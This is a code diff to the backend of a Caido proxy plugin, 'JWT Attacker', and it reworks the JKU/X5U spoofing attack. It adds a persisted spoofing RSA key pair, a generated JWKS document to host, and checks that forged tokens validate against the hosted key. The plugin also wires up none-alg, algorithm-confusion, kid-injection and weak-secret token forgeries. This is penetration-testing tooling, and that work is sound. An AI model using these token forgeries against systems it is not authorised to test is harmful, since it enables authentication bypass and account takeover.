@@ -1,14 +1,14 @@
 import { SDK, DefineAPI, DefineEvents } from "caido:plugin";
 import { RequestSpec } from "caido:utils";
 
-import { parseJWT, getAlgorithmFamily } from "./crypto/jwt.js";
-import { generateRSAKeyPair, type RSAKeyPair } from "./crypto/rsa.js";
+import { parseJWT, getAlgorithmFamily, verifyRS256WithJWK } from "./crypto/jwt.js";
+import { generateRSAKeyPair, buildJWKSDocument, type RSAKeyPair } from "./crypto/rsa.js";
 import { recoverPublicKeyFromJWTs } from "./crypto/keyRecovery.js";
 import { buildNoneAttacks } from "./attacks/none.js";
 import { buildNullSigAttacks } from "./attacks/nullSig.js";
 import { buildAlgConfusionAttacks, buildAlgConfusionForKeys } from "./attacks/algConfusion.js";
 import { buildEmbeddedJWKAttacks } from "./attacks/embeddedJwk.js";
-import { buildJKUSpoofAttacks } from "./attacks/jkuSpoof.js";
+import { buildJKUSpoofAttacks, SPOOF_KID } from "./attacks/jkuSpoof.js";
 import { buildKIDInjectionAttacks } from "./attacks/kidInject.js";
 import { buildClaimTamperAttacks } from "./attacks/claimTamper.js";
 import { buildWeakSecretAttacks } from "./attacks/weakSecret.js";
@@ -41,7 +41,16 @@ export type BackendEvents = DefineEvents<{
   "jwt-attack-complete": (data: { sessionId: string; errors: string[] }) => void;
   "jwt-key-recovery-progress": (data: { sessionId: string; message: string }) => void;
   "jwt-key-recovery-complete": (data: { sessionId: string; keys: string[] }) => void;
-  "jwks-payload": (data: { sessionId: string; jwksJson: string; privateKeyPem: string }) => void;
+  "jwks-spoof": (data: {
+    sessionId: string;
+    jwksJson: string;
+    privateKeyPem: string;
+    url: string;
+    verifyStatus: "verified" | "mismatch" | "unreachable" | "no-url";
+    verifyMessage: string;
+    fetchedContent: string;
+    selfVerified: boolean;
+  }) => void;
   "jwks-found": (data: { sessionId: string; url: string; source: string; keyCount: number; content: string; pems: string[] }) => void;
 }>;
 
@@ -107,16 +116,13 @@ async function attackJwt(
     // Generate one RSA key pair up front and reuse it for every JWK-injection
     // attack (embedded JWK + JKU/X5U). LLRT has no native key generation, so
     // this is a pure-BigInt operation — doing it once avoids repeating the cost.
+    // (JKU/X5U spoofing uses the persisted spoof key pair from config instead.)
     let rsaKeyPair: RSAKeyPair | undefined;
-    const haveConfiguredKeyPair = !!(cfg.customPrivateKeyPem && cfg.customPublicKeyPem);
-    const needsKeyPair =
-      cfg.enabledAttacks.embeddedJwk ||
-      (!!cfg.jwksUrl && (cfg.enabledAttacks.jkuSpoof || cfg.enabledAttacks.x5uSpoof) && !haveConfiguredKeyPair);
-    if (needsKeyPair) {
+    if (cfg.enabledAttacks.embeddedJwk) {
       try {
         sdk.api.send("jwt-key-recovery-progress", {
           sessionId,
-          message: "Generating RSA key pair for JWK-injection attacks…",
+          message: "Generating RSA key pair for the embedded-JWK attack…",
         });
         rsaKeyPair = generateRSAKeyPair(2048);
       } catch (e) {
@@ -147,22 +153,10 @@ async function attackJwt(
       await tryMerge("weakSecret", () => buildWeakSecretAttacks(parsed, cfg, originalJWT));
     }
 
-    if (cfg.enabledAttacks.jkuSpoof || cfg.enabledAttacks.x5uSpoof) {
-      try {
-        const { attacks: spoofAttacks, jwksContent, jwksKey } = buildJKUSpoofAttacks(parsed, cfg, rsaKeyPair);
-        merge(spoofAttacks);
-        if (jwksContent && jwksKey) {
-          sdk.api.send("jwks-payload", { sessionId, jwksJson: jwksContent, privateKeyPem: jwksKey });
-        }
-      } catch (e) {
-        errors.push(`[jkuSpoof] ${(e as Error).message}`);
-      }
-    }
-
     // HTTP GET through Caido's own networking (handles self-signed certs,
     // upstream proxy, scope, and appears in HTTP history) — used for JWKS /
-    // certificate discovery. The LLRT global `fetch` is unreliable for this and
-    // rejects invalid TLS certs commonly seen on test targets.
+    // certificate discovery and for verifying the hosted spoofing JWKS. The LLRT
+    // global `fetch` is unreliable for this and rejects invalid TLS certs.
     const httpGet = async (url: string): Promise<string> => {
       const getSpec = new RequestSpec(url);
       const sent = await sdk.requests.send(getSpec as unknown as Parameters<typeof sdk.requests.send>[0]);
@@ -173,6 +167,79 @@ async function attackJwt(
       const body = sent.response.getBody();
       return body ? bodyToText(body) : "";
     };
+
+    if (cfg.enabledAttacks.jkuSpoof || cfg.enabledAttacks.x5uSpoof) {
+      // Always sign with the PERSISTED spoofing key pair so the token matches the
+      // jwks.json shown in (and hosted from) the Configuration pane.
+      if (!cfg.spoofPrivateKeyPem || !cfg.spoofJwksJson) {
+        errors.push(
+          "[jkuSpoof] No spoofing key pair available — open the Configuration tab to " +
+          "generate one (the signing key must match the hosted jwks.json)."
+        );
+      } else {
+        try {
+          const { attacks: spoofAttacks } = buildJKUSpoofAttacks(parsed, cfg);
+          merge(spoofAttacks);
+
+          // Self-check: does our signed jku token validate against the configured
+          // (and hosted) JWKS public key? Proves the plugin's signing is correct.
+          let selfVerified = false;
+          try {
+            const jwk = (JSON.parse(cfg.spoofJwksJson).keys ?? [])[0] as { n?: string; e?: string } | undefined;
+            const jkuTok = spoofAttacks[0]?.modifiedJWT;
+            if (jwk?.n && jwk?.e && jkuTok) {
+              selfVerified = verifyRS256WithJWK(jkuTok, jwk.n, jwk.e);
+            }
+          } catch { /* leave false */ }
+          if (!selfVerified) {
+            errors.push("[jkuSpoof] Internal check failed: signed token did not validate against the configured JWKS.");
+          }
+
+          // Verify the JWKS actually hosted at the endpoint matches our key.
+          let verifyStatus: "verified" | "mismatch" | "unreachable" | "no-url" = "no-url";
+          let verifyMessage = "";
+          let fetchedContent = "";
+          if (!cfg.jwksUrl) {
+            verifyStatus = "no-url";
+            verifyMessage = "No JWKS Endpoint URL configured — a placeholder was used in the tokens. " +
+              "Set the URL in Configuration and host the JWKS for a working test.";
+            errors.push(`[jkuSpoof] ${verifyMessage}`);
+          } else {
+            try {
+              fetchedContent = await httpGet(cfg.jwksUrl);
+              if (jwksContainsKey(fetchedContent, cfg.spoofJwksJson)) {
+                verifyStatus = "verified";
+                verifyMessage = `The JWKS hosted at ${cfg.jwksUrl} matches the spoofing key (kid="${SPOOF_KID}"). ` +
+                  "The jku/x5u tokens will validate against it.";
+              } else {
+                verifyStatus = "mismatch";
+                verifyMessage = `The JWKS hosted at ${cfg.jwksUrl} does NOT contain the spoofing key (kid="${SPOOF_KID}"). ` +
+                  "Re-host the jwks.json shown in the Configuration tab.";
+                errors.push(`[jkuSpoof] ${verifyMessage}`);
+              }
+            } catch (e) {
+              verifyStatus = "unreachable";
+              verifyMessage = `Could not fetch the JWKS Endpoint URL (${cfg.jwksUrl}): ${(e as Error).message}. ` +
+                "Ensure the jwks.json is hosted there and reachable from Caido.";
+              errors.push(`[jkuSpoof] ${verifyMessage}`);
+            }
+          }
+
+          sdk.api.send("jwks-spoof", {
+            sessionId,
+            jwksJson: cfg.spoofJwksJson,
+            privateKeyPem: cfg.spoofPrivateKeyPem,
+            url: cfg.jwksUrl || "(not configured)",
+            verifyStatus,
+            verifyMessage,
+            fetchedContent: fetchedContent.slice(0, 8192),
+            selfVerified,
+          });
+        } catch (e) {
+          errors.push(`[jkuSpoof] ${(e as Error).message}`);
+        }
+      }
+    }
 
     if (cfg.enabledAttacks.algConfusion) {
       await tryMerge("algConfusion", () => buildAlgConfusionAttacks(
@@ -300,7 +367,33 @@ async function getJWTsInRequest(
   return findJWTsInSpec(reqResp.request.toSpec() as unknown as IRequestSpec);
 }
 
+// Generate a fresh RSA spoofing key pair and the matching JWKS document to host.
+// The private key signs spoofed (jku/x5u) tokens; the JWKS exposes the public
+// key under SPOOF_KID, so the two are guaranteed consistent.
+async function generateSpoofKeyPair(
+  _sdk: SDK<API, BackendEvents>
+): Promise<{ privateKeyPem: string; jwksJson: string }> {
+  const kp = generateRSAKeyPair(2048);
+  const jwks = buildJWKSDocument({ ...kp.publicJwk, kid: SPOOF_KID }, SPOOF_KID);
+  return { privateKeyPem: kp.privateKeyPem, jwksJson: JSON.stringify(jwks, null, 2) };
+}
+
 // ─── Helpers ────────────────────────────────────────────────────────────────
+
+// Does the hosted JWKS contain the exact public key from our configured JWKS?
+function jwksContainsKey(hostedRaw: string, expectedRaw: string): boolean {
+  try {
+    const hosted = JSON.parse(hostedRaw) as { keys?: Array<Record<string, unknown>> };
+    const expected = JSON.parse(expectedRaw) as { keys?: Array<Record<string, unknown>> };
+    const exp = expected.keys?.[0];
+    if (!exp) return false;
+    return (hosted.keys ?? []).some(
+      (k) => k.kty === exp.kty && k.n === exp.n && k.e === exp.e && k.kid === exp.kid
+    );
+  } catch {
+    return false;
+  }
+}
 
 const ALL_ATTACKS = [
   "none", "nullSig", "algConfusion", "embeddedJwk", "jkuSpoof",
@@ -329,6 +422,8 @@ function normalizeConfig(raw: unknown): PluginConfig {
     customCertPem: typeof c.customCertPem === "string" ? c.customCertPem : "",
     jwksPaths: Array.isArray(c.jwksPaths) && c.jwksPaths.length ? c.jwksPaths : [...COMMON_JWKS_PATHS],
     customWordlist: Array.isArray(c.customWordlist) ? c.customWordlist : [],
+    spoofPrivateKeyPem: typeof c.spoofPrivateKeyPem === "string" ? c.spoofPrivateKeyPem : "",
+    spoofJwksJson: typeof c.spoofJwksJson === "string" ? c.spoofJwksJson : "",
     enableKeyRecovery: c.enableKeyRecovery === true,
     enabledAttacks,
   };
@@ -486,11 +581,13 @@ async function collectHistoryJWTs(
 export type API = DefineAPI<{
   attackJwt: typeof attackJwt;
   getJWTsInRequest: typeof getJWTsInRequest;
+  generateSpoofKeyPair: typeof generateSpoofKeyPair;
 }>;
 
 export function init(sdk: SDK<API, BackendEvents>): void {
   sdk.console.log("[JWT Attacker] backend init() called");
   sdk.api.register("attackJwt", attackJwt);
   sdk.api.register("getJWTsInRequest", getJWTsInRequest);
+  sdk.api.register("generateSpoofKeyPair", generateSpoofKeyPair);
   sdk.console.log("[JWT Attacker] backend init() complete");
 }
